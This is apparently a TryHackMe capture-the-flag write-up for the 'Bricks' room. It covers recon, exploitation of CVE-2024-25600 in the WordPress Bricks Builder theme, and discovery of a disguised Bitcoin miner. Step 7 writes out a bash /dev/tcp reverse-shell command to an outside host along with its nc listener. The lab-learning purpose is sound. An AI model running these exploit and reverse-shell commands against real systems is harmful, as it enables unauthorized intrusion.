# Bricks — TryHackMe Writeup
> **Platform:** TryHackMe | **Category:** Web, CVE Exploitation, Cryptomining Malware

---

## Overview

This machine exposes a WordPress site running the vulnerable **Bricks Builder** theme (v1.9.5), affected by an unauthenticated Remote Code Execution vulnerability (CVE-2024-25600). After gaining shell access as `apache`, a suspicious background process is discovered — a `websockify` service silently proxying port 80 to an internal VNC port. Deeper inspection of the process's working directory uncovers a disguised configuration file (`inet.conf`) that turns out to be the log of a running Bitcoin miner, along with a Base64-encoded wallet ID.

**Attack Chain:**
```
Nmap → Directory fuzzing (gobuster) → WordPress/theme fingerprinting (WPScan)
→ CVE-2024-25600 RCE → Shell as apache → Process enumeration
→ Discovery of hidden cryptominer → Wallet ID recovered
```

---

## Step 1 — Reconnaissance

A quick ping scan to identify open ports:

```bash
sudo nmap -Pn 10.64.154.95
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
```

Following up with service/version and OS detection:

```bash
sudo nmap -sV -O 10.64.154.95
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Python http.server 3.5 - 3.10
443/tcp  open  ssl/http Apache httpd
3306/tcp open  mysql   MySQL (unauthorized)
No exact OS matches for host
```

Four open services in total. Port 80 is served by a lightweight Python HTTP server and is the natural starting point.

---

## Step 2 — Initial Web Enumeration

Browsing to port 80 shows a single message, **"Brick by Brick"**, with a redirect pointing to:

```
https://10.64.154.95/#brx-content
```

Fuzzing both endpoints with Gobuster:

```bash
gobuster dir -u https://bricks.thm/ -w common.txt
```

The TLS certificate turns out to be expired, so certificate validation has to be skipped:

```
error on running gobuster on https://bricks.thm/: unable to connect: 
x509: certificate has expired or is not yet valid
```

Re-running with `-k` to ignore the certificate error:

```bash
gobuster dir -u https://bricks.thm/ -w common.txt -k
```

Notable results:

```
admin        (Status: 302) [--> https://bricks.thm/wp-admin/]
dashboard    (Status: 302) [--> https://bricks.thm/wp-admin/]
feed         (Status: 301) [--> https://bricks.thm/feed/]
login        (Status: 302) [--> https://bricks.thm/wp-login.php]
phpmyadmin   (Status: 301) [Size: 238] [--> https://bricks.thm/phpmyadmin/]
robots.txt   (Status: 200) [Size: 67]
wp-admin     (Status: 301) [--> https://bricks.thm/wp-admin/]
wp-content   (Status: 301) [--> https://bricks.thm/wp-content/]
wp-includes  (Status: 301) [--> https://bricks.thm/wp-includes/]
```

This confirms a WordPress installation with an exposed phpMyAdmin instance and a working search endpoint (`https://bricks.thm/?s=`).

---

## Step 3 — Information Disclosure via RSS Feed

Fetching `/feed/atom` downloads an XML file that discloses a username and the underlying platform:

```
administrator
http://localhost:8000
WordPress
```

This gives a likely admin username to work with going forward.

---

## Step 4 — WordPress & Theme Fingerprinting

Running WPScan against the target:

```bash
wpscan --url https://bricks.thm/ --disable-tls-checks -e vp,vt,u
```

The scan identifies the active theme:

```
[+] WordPress theme in use: bricks
    | Location: https://bricks.thm/wp-content/themes/bricks/
    | Version: 1.9.5 (80% confidence)
```

A search for known vulnerabilities in Bricks Builder 1.9.5 turns up:

> **CVE-2024-25600** — WordPress Bricks Builder Remote Code Execution (RCE)

A public exploit for this CVE is available on GitHub:
[`K3ysTr0K3R/CVE-2024-25600-EXPLOIT`](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)

---

## Step 5 — Exploitation → Shell as `apache`

Running the exploit against the target:

```bash
python3 CVE-2024-25600.py -u https://bricks.thm/
```

```
Shell> whoami
apache
```

Remote code execution confirmed. The first flag is found immediately in the current directory:

```
Shell> cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

---

## Step 6 — Discovering the Suspicious Process

One of the challenge questions asks for the name of the service tied to a suspicious process, which prompts a look at running processes:

```bash
Shell> ps aux
```

```
root  1627  0.0  0.5  121120  22392  ?  S  04:43  0:02  python3 -m websockify 80 localhost:5901 -D
```

This process quietly proxies external traffic on port 80 to an internal VNC service on port 5901 — not something expected on a standard WordPress deployment.

---

## Step 7 — Upgrading Access with a Reverse Shell

To explore further, a reverse shell is spawned back to the attacking machine:

```bash
Shell> bash -c 'exec bash -i >& /dev/tcp/192.168.138.111/443 0>&1'
```

Listener on the attacking machine:

```bash
sudo nc -lvnp 443
```

```
Listening on 0.0.0.0 443
Connection received on 10.67.180.97 33394
apache@ip-10-67-180-97:/data/www/default$
```

The web directory only contains the flag file found earlier.

---

## Step 8 — Uncovering the Cryptominer

Investigating the working directory tied to the suspicious `websockify` process reveals a file that doesn't belong on a standard Linux install, disguised inside `/lib/NetworkManager`:

```bash
apache@ip-10-67-180-97:/lib/NetworkManager$ ls
VPN  conf.d  dispatcher.d  inet.conf  nm-dhcp-helper  nm-dispatcher  ...
```

`inet.conf` stands out — a name that mimics a legitimate NetworkManager component. Its contents, however, tell a different story:

```
ID: 5757314e654747...  (Base64-encoded string)
2025-11-01 15:36:36,211 [] confbak: Ready!
2025-11-01 15:36:36,211 [] Status: Mining!
2025-11-01 15:36:40,214 [] Miner()
2025-11-01 15:36:40,214 [] Bitcoin Miner Thread Started
2025-11-01 15:36:42,216 [] Miner()
...
```

This is the log output of an active **Bitcoin mining process** disguised as a network utility — a classic cryptojacking persistence technique, hidden under a name and location that blend in with legitimate system files.

---

## Step 9 — Decoding the Wallet ID

The Base64-encoded `ID` field at the top of the log decodes to a Bitcoin wallet address, which serves as the final flag for this stage:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

---

## Summary of Findings

| Step | Vulnerability | Impact |
|------|---------------|--------|
| Recon | Exposed phpMyAdmin, WordPress login, and RSS feed username disclosure | Attack surface & username enumeration |
| Theme Fingerprinting | Outdated Bricks Builder theme (v1.9.5) | Identified CVE-2024-25600 |
| Exploitation | Unauthenticated RCE in Bricks Builder | Remote shell as `apache` |
| Post-Exploitation | Hidden `websockify` process proxying port 80 → internal VNC | Indicator of prior compromise |
| Persistence Discovery | Disguised cryptominer (`inet.conf`) inside `/lib/NetworkManager` | Evidence of cryptojacking, wallet ID recovered |

---

## Key Takeaways

- **Outdated plugins/themes remain a top WordPress attack vector** — Bricks Builder 1.9.5 was vulnerable to an unauthenticated RCE with a public exploit available.
- **RSS/Atom feeds can leak usernames** — often overlooked, `/feed/atom` is a quick and easy source of user enumeration.
- **Expired TLS certificates shouldn't be dismissed** — encountering one during recon is itself worth noting on a real engagement.
- **Cryptojacking malware often hides in plain sight** — naming a malicious file `inet.conf` and placing it inside `/lib/NetworkManager` is a simple but effective way to blend in with legitimate system files.
- **Unusual listening services deserve scrutiny** — a `websockify` process silently forwarding a public web port to an internal VNC port is a strong indicator of prior compromise, not a legitimate WordPress feature.
